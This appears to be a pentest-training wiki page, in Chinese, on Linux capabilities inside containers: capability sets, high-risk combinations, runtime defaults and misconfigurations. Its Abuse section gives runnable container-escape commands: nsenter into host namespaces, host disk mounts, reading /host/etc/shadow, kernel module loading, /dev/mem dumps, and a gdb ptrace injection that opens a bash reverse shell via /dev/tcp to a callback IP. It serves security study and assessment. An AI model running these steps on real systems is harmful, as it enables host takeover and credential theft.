# Linux Capabilities In Containers

{{#include ../../../../banners/hacktricks-training.md}}

## 概述

Linux capabilities 是 container security 中最重要的组成部分之一，因为它们回答了一个微妙但根本性的问题：**在 container 内部，“root”究竟意味着什么？**在普通 Linux 系统中，UID 0 历来意味着非常广泛的 privilege set。在现代 kernel 中，这种 privilege 被拆分为称为 capabilities 的更小单元。如果移除了相关 capabilities，即使进程以 root 身份运行，也可能无法执行许多强大的操作。 <sup>[[1]](#references)</sup>

Containers 高度依赖这种区别。出于兼容性或简单性原因，许多 workload 仍会在 container 内以 UID 0 启动。如果不移除 capabilities，这将非常危险。移除 capabilities 后，containerized root process 仍可以执行许多普通的 container 内任务，同时被禁止执行更敏感的 kernel 操作。因此，container shell 显示 `uid=0(root)`，并不自动意味着“host root”，甚至不意味着拥有“广泛的 kernel privilege”。Capability sets 决定了这个 root identity 实际上有多大价值。

如需完整的 Linux capability reference 以及许多 abuse examples，请参阅：

{{#ref}}
../../../interesting-files-permissions/linux-capabilities.md
{{#endref}}

## 操作

Capabilities 会被记录在多个 sets 中，包括 permitted、effective、inheritable、ambient 和 bounding sets。对于许多 container assessments 而言，与其立即深入了解每个 set 的精确 kernel semantics，不如先关注最终的实际问题：**该进程现在可以成功执行哪些 privileged operations，以及未来仍有哪些 privilege gains 可能实现？** <sup>[[1]](#references)</sup>

这之所以重要，是因为许多 breakout techniques 本质上是被伪装成 container 问题的 capability 问题。拥有 `CAP_SYS_ADMIN` 的 workload 可以访问大量 normal container root process 不应接触的 kernel functionality。如果 workload 具有 `CAP_NET_ADMIN`，并且同时共享 host network namespace，其危险性会进一步增加。如果 workload 具有 `CAP_SYS_PTRACE`，并且能够通过 host PID sharing 看到 host processes，那么它就更值得关注。在 Docker 或 Podman 中，这可能表现为 `--pid=host`；在 Kubernetes 中，通常表现为 `hostPID: true`。

换句话说，不能孤立地评估 capability set。必须结合 namespaces、seccomp 和 MAC policy 一起分析。

## 实验

在 container 内检查 capabilities 的一种非常直接的方法是：
```bash
docker run --rm -it debian:stable-slim bash
apt-get update && apt-get install -y libcap2-bin
capsh --print
```
你还可以将限制更严格的容器与添加了所有 capabilities 的容器进行比较：
```bash
docker run --rm debian:stable-slim sh -c 'grep CapEff /proc/self/status'
docker run --rm --cap-add=ALL debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```
要查看精简添加的效果，可以先删除所有 capability，然后只添加回一个 capability：
```bash
docker run --rm --cap-drop=ALL --cap-add=NET_BIND_SERVICE debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```
这些小型实验有助于说明，runtime 并不是简单地切换一个名为 "privileged" 的布尔值，而是在塑造进程实际可用的权限面。

## High-Risk Capabilities

只有当某项操作能够触及**由 host 控制的资源**时，Capabilities 才会成为 escape 原语。反复出现的高风险组合包括：

- **`CAP_SYS_ADMIN`** 加上 host PID、块设备或可写的 kernel-control 路径。加入目标 mount namespace 还需要 `CAP_SYS_CHROOT`；挂载基于块设备的文件系统，则需要 initial user namespace 中的 `CAP_SYS_ADMIN`。
- **`CAP_SYS_PTRACE`** 加上 host PID 可见性，以及一个可附加的 host 进程。ptrace 注入不需要 `CAP_SYS_ADMIN`。
- **`CAP_DAC_OVERRIDE` 或 `CAP_DAC_READ_SEARCH`** 加上可访问的 host 文件系统。这些 capabilities 会绕过不同的 DAC 检查，但不会创建 host 文件系统视图。
- **initial user namespace 中的 `CAP_SYS_MODULE`** 加上一个被接受且与 kernel 兼容的模块。普通 Linux containers 共享节点 kernel；VM 或 userspace-kernel runtimes 会改变这一边界。
- **initial user namespace 中的 `CAP_MKNOD`** 加上一个 device cgroup 已经允许使用的真实 host 设备。创建节点不会绕过 device cgroup。
- **`CAP_SYS_RAWIO`** 加上一个已暴露且可用的 memory、I/O-port、PCI 或 device-control 接口。
- **`CAP_SYS_BOOT`** 加上用于 host reboot 的 initial PID namespace，或一个可用且获准的 kexec 路径，用于替换 kernel。
- **host network namespace 中的 `CAP_NET_ADMIN`**，用于直接控制节点的网络状态。**`CAP_NET_RAW`** 可以参与特定协议的 escape，但 raw sockets 单独并不能提供节点 shell。

`CAP_SYS_CHROOT` 有意未被列为独立的 escape capability。mount-namespace `setns()` 可能需要它，它也可以让一个已经可访问的 host tree 更易于使用，但单独的 `chroot()` 既不会暴露该 tree，也不会授予新的文件系统权限。同样，`CAP_BPF` 和 `CAP_PERFMON` 会暴露强大的 telemetry 和 kernel attack surface，但在不存在独立 kernel flaw 的情况下，它们的常规操作并不是通用的 container escapes。

## Runtime Usage

Docker、Podman、基于 containerd 的 stacks 和 CRI-O 都使用 capability 控制，但默认设置和管理接口各不相同。Docker 通过 `--cap-drop` 和 `--cap-add` 等 flags 直接暴露这些控制项。Podman 提供类似的控制项，并且通常会将其与 rootless execution 结合，作为额外的安全层。Kubernetes 通过 Pod 或 container 的 `securityContext` 暴露 capability additions 和 drops；更底层的 runtimes 则在 OCI runtime configuration 中表达最终的 sets。LXC 和 Incus 等 system-container 环境也依赖 capability 控制，但它们更广泛的 host 集成可能会诱使 operators 比管理 application container 时更激进地放宽默认设置。 <sup>[[2]](#references)</sup> <sup>[[3]](#references)</sup> <sup>[[4]](#references)</sup> <sup>[[5]](#references)</sup> <sup>[[6]](#references)</sup>

同一原则适用于所有这些环境：技术上可以授予的 capability，并不一定是应该授予的 capability。许多现实世界中的 incidents 都始于这样的情况：某个 workload 在更严格的 configuration 下运行失败，而团队需要快速修复，于是 operator 仅仅因为这个原因就添加了一项 capability。

## Misconfigurations

最明显的错误是在 Docker/Podman 风格的 CLIs 中使用 **`--cap-add=ALL`**，但这并不是唯一的问题。实践中，更常见的问题是授予一两项极其强大的 capabilities，尤其是 `CAP_SYS_ADMIN`，以便“让 application 正常工作”，却没有同时理解 namespace、seccomp 和 mount 的影响。另一个常见的 failure mode 是将额外 capabilities 与 host namespace sharing 结合使用。在 Docker 或 Podman 中，这可能表现为 `--pid=host`、`--network=host` 或 `--userns=host`；在 Kubernetes 中，对应的暴露通常通过 `hostPID: true` 或 `hostNetwork: true` 等 workload 设置出现。每一种组合都会改变该 capability 实际能够影响的范围。

管理员还经常认为，只要 workload 没有完全使用 `--privileged`，就仍然受到了实质性限制。有时确实如此，但有时 effective posture 已经足够接近 privileged，以至于这种区别在运营层面不再重要。

## Abuse

首先记录 effective sets、user-namespace mapping、seccomp 状态、namespaces、mounts 和 devices。脱离这些上下文，仅凭 capability 名称无法证明存在 escape：
```bash
capsh --print
grep -E 'Cap(Inh|Prm|Eff|Bnd|Amb)|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map /proc/self/gid_map
ls -l /proc/self/ns
findmnt
```
### `CAP_SYS_ADMIN`：命名空间和块设备

在可见主机 PID 的情况下，`CAP_SYS_ADMIN` 可以进入主机命名空间。挂载命名空间操作还需要调用者用户命名空间中的 `CAP_SYS_CHROOT`。

**检查 capability 和隔离限制：**
```bash
capsh --print | grep -E 'cap_sys_admin|cap_sys_chroot'
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map /proc/self/gid_map
```
**枚举目标：**从 container/Pod 配置或明确的 host 进程列表中确认是否共享 host PID，然后检查目标 namespaces。私有 PID namespaces 中也存在本地 PID 1，因此仅凭其存在无法证明共享了 host PID。
```bash
ps -eo pid,user,comm,args
target_pid=1
tr '\0' ' ' <"/proc/${target_pid}/cmdline"; echo
ls -l "/proc/${target_pid}/ns/"{mnt,pid,net,ipc,uts,user}
```
**利用 namespace 路径：**
```bash
nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/sh
id
findmnt /
```
capability checks 必须在拥有目标的 user namespaces 中成功。`--pid=host` 或 Kubernetes `hostPID: true` 提供的是可见性，而不是 capabilities。

对于替代的 block-device 路径，先 **enumerate** 候选项，然后通过先以只读方式 mounting 已验证的候选项来 **exploit** 可访问的 filesystem：
```bash
lsblk -o NAME,PATH,TYPE,SIZE,FSTYPE,MOUNTPOINTS
node_root_device=/dev/vda1  # Replace with the validated candidate.
mkdir -p /mnt/hostdisk
mount -o ro "${node_root_device}" /mnt/hostdisk
cat /mnt/hostdisk/etc/hostname
umount /mnt/hostdisk
```
设备节点必须存在，device cgroup 必须允许访问，而 block-filesystem mounts 需要在 initial user namespace 中具备 `CAP_SYS_ADMIN`。已经在 `/host` 挂载的 host root 即表示无需 `CAP_SYS_ADMIN` 的 host access；`chroot /host` 仅是便利操作，并且还需要单独具备 `CAP_SYS_CHROOT`。

### 可访问的 host root：直接执行文件系统

如果 host root 已经挂载到 `/host`，请先确认挂载情况，然后直接使用现有访问权限。此路径不依赖 `CAP_SYS_ADMIN`：
```bash
findmnt -T /host -o TARGET,SOURCE,FSTYPE,OPTIONS
ls -la /host
chroot /host /bin/bash
```
如果 `chroot()` 不可用，但主机 binary 与 container 的架构和 loader 兼容，通常可以改为通过已挂载的 tree 调用它：
```bash
/host/bin/bash -p
export PATH=/host/usr/sbin:/host/usr/bin:/host/sbin:/host/bin:$PATH
```
在 `/host` 下直接读取和写入已经属于对 host filesystem 的 compromise。`chroot()` 或执行 host binary 只会让这种访问更方便；这两种操作都不会创建 host mount，也不会绕过 read-only mount 或 MAC policy。

### `CAP_SYS_PTRACE`：host-process injection

当目标的 user namespace 具有 host PID 可见性和 `CAP_SYS_PTRACE` 时，GDB 可以让一个获准的 host process 调用 `system()`。不需要 `CAP_SYS_ADMIN`。

**检查 capability 和 attachment controls：**
```bash
capsh --print | grep cap_sys_ptrace
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map
cat /proc/sys/kernel/yama/ptrace_scope 2>/dev/null
```
**枚举并选择一个可丢弃的目标：**通过配置或明确无误的节点进程列表确认主机 PID 共享；切勿选择 PID 1 或关键守护进程。
```bash
ps -eo pid,user,comm,args
target_pid=<approved-lab-process-pid>
readlink "/proc/${target_pid}/exe"
grep -E '^(Name|Uid|Gid|TracerPid|NoNewPrivs|Seccomp):' \
"/proc/${target_pid}/status"
```
**利用选定的进程：**
```bash
# On a reachable assessment system:
nc -lvnp 4444

# In the container:
callback_ip=192.0.2.10
callback_port=4444
gdb -q -nx -batch -p "${target_pid}" \
-ex "call (int) system(\"bash -c 'bash -i >& /dev/tcp/${callback_ip}/${callback_port} 0>&1'\")" \
-ex detach
```
目标必须可附加，并且具有可用的 `system()` 符号和 Bash payload 路径。Yama、不可转储状态、seccomp、user namespaces 以及 MAC policy 都可能阻断该链。GDB 在附加时会暂停目标，因此只能使用一次性实验室进程。

### `CAP_DAC_OVERRIDE` 和 `CAP_DAC_READ_SEARCH`：受保护的 host 文件

这些 capabilities 不会暴露 host filesystem。如果 `/host` 已经是一个 host mount，`CAP_DAC_READ_SEARCH` 可以绕过读取/搜索 DAC 检查，而 `CAP_DAC_OVERRIDE` 还可以额外绕过普通写入检查：

**检查 capabilities：**
```bash
capsh --print | grep -E 'cap_dac_override|cap_dac_read_search'
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
```
**枚举暴露的主机文件系统并确定目标权限：**
```bash
findmnt -T /host -o TARGET,SOURCE,FSTYPE,OPTIONS
stat -c 'owner=%u:%g mode=%A path=%n' \
/host/etc/shadow /host/root /host/var/lib/kubelet 2>/dev/null
find /host/var/lib/kubelet -maxdepth 3 -type f -readable -ls 2>/dev/null | head
```
**在临时实验环境中测试读写绕过方法**：
```bash
head -n 1 /host/etc/shadow
printf 'DAC proof from uid=%s\n' "$(id -u)" >/host/root/ht-dac-proof
rm /host/root/ht-dac-proof
```
只读挂载和 LSM 规则仍然适用。`CAP_DAC_READ_SEARCH` 还授权使用 `open_by_handle_at()`，但像 Shocker 这样的 breakout 还需要针对同一底层文件系统的挂载文件描述符、有效或可发现的 handles、兼容的文件系统/存储布局，以及没有 runtime 或 LSM 阻止。它并不能提供对挂载 namespace 外每个文件系统的任意访问权限。

### `CAP_SYS_MODULE`：共享内核执行

在普通的 Linux container 中，已接受的 module 会在共享的 host kernel 中运行。

**检查 capability 及其 user-namespace 范围：**
```bash
capsh --print | grep cap_sys_module
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map
```
**枚举模块加载的前置条件：**
```bash
uname -r
cat /proc/sys/kernel/modules_disabled
cat /sys/kernel/security/lockdown 2>/dev/null
grep -E 'CONFIG_MODULES=|CONFIG_MODULE_SIG(_FORCE)?=' \
"/boot/config-$(uname -r)" 2>/dev/null
modinfo /lab/ht-proof.ko
```
**仅在 disposable node 上使用兼容且经过预审的 proof module 进行 Exploit：**
```bash
insmod /lab/ht-proof.ko
grep '^ht_proof ' /proc/modules
rmmod ht_proof
```
该 capability 必须在初始 user namespace 中生效。Kernel 版本和配置、module signatures、lockdown、seccomp 以及 LSM policy 必须允许加载。Kata、gVisor、Hyper-V isolation 及类似 runtime 会改变 workload 所能到达的 kernel boundary。

### `CAP_MKNOD`：创建允许的 device handle

`CAP_MKNOD` 可创建 device node，但不会绕过 device cgroup。Device creation 不受 namespace 隔离，因此该 capability 必须在初始 user namespace 中生效。

**检查 capability 和 user-namespace 作用域：**
```bash
capsh --print | grep cap_mknod
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map
```
**枚举真实设备、其主设备号/次设备号，以及任何可见的 cgroup-v1 allowlist：**
```bash
lsblk -o NAME,PATH,TYPE,SIZE,FSTYPE,MOUNTPOINTS 2>/dev/null
for device_file in /sys/class/block/*/dev; do
printf '%s %s\n' "${device_file}" "$(cat "${device_file}")"
done
cat /sys/fs/cgroup/devices/devices.list 2>/dev/null
```
**利用经过验证的 ext-family 候选项进行只读操作：**
```bash
node_block_name=vda1                       # Replace with the validated candidate.
device_numbers=$(cat "/sys/class/block/${node_block_name}/dev")
device_major=${device_numbers%:*}
device_minor=${device_numbers#*:}
mknod /dev/ht-node-root b "${device_major}" "${device_minor}"
debugfs -R 'cat /etc/hostname' /dev/ht-node-root
rm /dev/ht-node-root
```
其他文件系统需要匹配的只读工具；此外，挂载设备还需要 `CAP_SYS_ADMIN`。打开所创建节点时出现 `Operation not permitted`，通常表示 device cgroup 仍在阻止访问。在 cgroup v2 下，设备访问通常通过 BPF 强制执行，并且不存在 `devices.list` 文件，因此成功打开设备是决定性测试。

### `CAP_SYS_RAWIO`：暴露的 raw-I/O 接口

不存在可移植的通用 payload：有效地址和产生的效果取决于硬件与内核配置。

**检查 capability 以及 user namespace 的作用域：**
```bash
capsh --print | grep cap_sys_rawio
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map
```
**枚举暴露的原始接口、硬件和驱动程序：**
```bash
ls -l /dev/mem /dev/port 2>/dev/null
lspci -nnk 2>/dev/null
find /sys/bus/pci/devices -maxdepth 2 -name 'resource*' -ls 2>/dev/null
```
**仅使用针对已识别设备和地址范围的已批准 proof 进行 exploit。** 如果 `/dev/mem` 是实验室批准的接口，此模板可证明节点内存泄露，而不会打印其内容：
```bash
approved_physical_address=<lab-provided-decimal-address>
approved_byte_count=<lab-provided-size>
dd if=/dev/mem of=/tmp/ht-rawio-proof.bin bs=1 \
skip="${approved_physical_address}" count="${approved_byte_count}" status=none
wc -c /tmp/ht-rawio-proof.bin
sha256sum /tmp/ht-rawio-proof.bin
rm /tmp/ht-rawio-proof.bin
```
地址必须来自 lab 的硬件映射，因为读取某些 MMIO 区域可能产生副作用。通用的内存写入命令会造成误导且不安全：同一个地址在一台机器上可能无害，在另一台机器上却可能控制硬件或 kernel memory。Device cgroups、filesystem permissions、严格的 `/dev/mem`、kernel lockdown、virtualization 和 LSM policy 通常会阻止有用的访问。

### `CAP_SYS_BOOT`：namespace reboot 或 kernel replacement

在私有 PID namespace 中，`reboot()` 会终止该 namespace 的 init process，而不是 reboot host。因此，要影响 host reboot，需要 initial PID namespace，通常通过 host PID sharing 实现。kexec 路径还需要兼容的 kernel image，以及宽松的 lockdown/signature policy：

**检查 capability：**
```bash
capsh --print | grep cap_sys_boot
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map
```
**枚举 PID-namespace 和 kexec 的前置条件：从 workload 配置中确认是否共享 host PID，因为仅凭 PID namespace link 无法确定它是否为 node 的初始 namespace。**
```bash
ps -p 1 -o pid,user,comm,args
readlink /proc/self/ns/pid
command -v kexec 2>/dev/null
cat /sys/kernel/security/lockdown 2>/dev/null
```
**仅在重启一次性实验室节点是明确练习要求时才进行 Exploit：**
```bash
sync
reboot -f
```
不要仅仅为了证明该 capability 而在共享节点上执行该命令或加载 kernel。在私有 PID namespace 中，它只会终止该 namespace 的 init 进程，并不能证明对 host 的影响。

### `CAP_NET_ADMIN` 和 `CAP_NET_RAW`：host network paths

`CAP_NET_ADMIN` 只影响当前 network namespace。

**检查 capabilities 和 confinement：**
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
```
**枚举当前网络，并从 workload 配置中确认 host networking：**
```bash
readlink /proc/self/ns/net
ip -brief address
ip route
nft list ruleset 2>/dev/null || iptables-save 2>/dev/null
```
**以可逆方式使用 `CAP_NET_ADMIN`：使用 host networking 时，临时 interface 是 node interface。**
```bash
ip link add ht-net-admin-proof type dummy
ip addr add 192.0.2.1/32 dev ht-net-admin-proof
ip link set ht-net-admin-proof up
ip -brief addr show ht-net-admin-proof
ip link delete ht-net-admin-proof
```
`CAP_NET_RAW` 允许使用 RAW 和 PACKET sockets，但并不是通用的 host shell。要**枚举**已记录的 GCE chain，请检查 metadata route，并捕获是否可以观测到明文 guest-agent 流量：
```bash
ip route get 169.254.169.254
tcpdump -ni any -c 20 'host 169.254.169.254'
```
如果存在匹配的前置条件，请按照 [GCP - Network Docker Escape](https://cloud.hacktricks.wiki/en/pentesting-cloud/gcp-security/gcp-privilege-escalation/gcp-network-docker-escape.html) 中的说明 **exploit** 特定环境的 chain：捕获请求和序列状态，注入包含 SSH key 的伪造 metadata 响应，然后验证主机访问权限。该 chain 要求 root、主机网络、`CAP_NET_ADMIN`、`CAP_NET_RAW`、明文 GCE metadata 流量，以及一个可进行 race 的 guest-agent 请求；现代传输方式或 agent 行为可能导致其失效。

## 检查

检查 capabilities 的目的不仅是转储原始值，还要了解进程是否拥有足够的权限，使其当前 namespace 和 mount 状态变得危险。
```bash
capsh --print                    # Human-readable capability sets and securebits
grep '^Cap' /proc/self/status    # Raw kernel capability bitmasks
```
这里有哪些值得关注的内容：

- `capsh --print` 是发现高风险 capabilities（例如 `cap_sys_admin`、`cap_sys_ptrace`、`cap_net_admin` 或 `cap_sys_module`）最简单的方法。
- `/proc/self/status` 中的 `CapEff` 行会告诉你当前实际生效的内容，而不只是其他集合中可能可用的内容。
- 如果 container 同时共享 host PID、network 或 user namespaces，或者挂载了可写的 host mounts，那么 capability dump 的重要性会大幅提升。

收集原始 capability 信息后，下一步是进行解读。需要确认进程是否为 root、user namespaces 是否启用、host namespaces 是否共享、seccomp 是否处于 enforcing 状态，以及 AppArmor 或 SELinux 是否仍在限制该进程。单独的 capability set 只是整体情况的一部分，但它通常能解释为什么某个 container breakout 能够成功，而另一个从表面上相同起点开始的 breakout 却会失败。

## Runtime Defaults

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | 默认使用精简的 capability set | Docker 默认保留一份 capabilities allowlist，并移除其余 capabilities | `--cap-add=<cap>`、`--cap-drop=<cap>`、`--cap-add=ALL`、`--privileged` |
| Podman | 默认使用精简的 capability set | Podman containers 默认以 unprivileged 模式运行，并使用精简的 capability model | `--cap-add=<cap>`、`--cap-drop=<cap>`、`--privileged` |
| Kubernetes | 除非进行修改，否则继承 runtime defaults | 如果未指定 `securityContext.capabilities`，container 会从 runtime 获取默认 capability set | `securityContext.capabilities.add`、未执行 `drop: [\"ALL\"]`、`privileged: true` |
| containerd / CRI-O under Kubernetes | 通常使用 runtime default | 实际生效的 set 取决于 runtime 以及 Pod spec | 与 Kubernetes 行相同；直接的 OCI/CRI configuration 也可以显式添加 capabilities |

对于 Kubernetes，重要的一点是：其 API 并未定义一个统一的默认 capability set。如果 Pod 没有添加或移除 capabilities，该 workload 会继承对应 node 上 runtime 的默认值。

## References

- [1] [capabilities(7) - Linux 手册页](https://man7.org/linux/man-pages/man7/capabilities.7.html)
- [2] [Open Container Initiative - Linux container configuration](https://github.com/opencontainers/runtime-spec/blob/main/config-linux.md#process)
- [3] [Docker Docs - Runtime privilege and Linux capabilities](https://docs.docker.com/engine/containers/run/#runtime-privilege-and-linux-capabilities)
- [4] [Kubernetes 文档 - 为 container 设置 capabilities](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/#set-capabilities-for-a-container)
- [5] [Podman 文档 - `--cap-add` 和 `--cap-drop`](https://docs.podman.io/en/latest/markdown/podman-run.1.html#cap-add-capability)
- [6] [Incus 文档 - Security](https://linuxcontainers.org/incus/docs/main/explanation/security/)
{{#include ../../../../banners/hacktricks-training.md}}
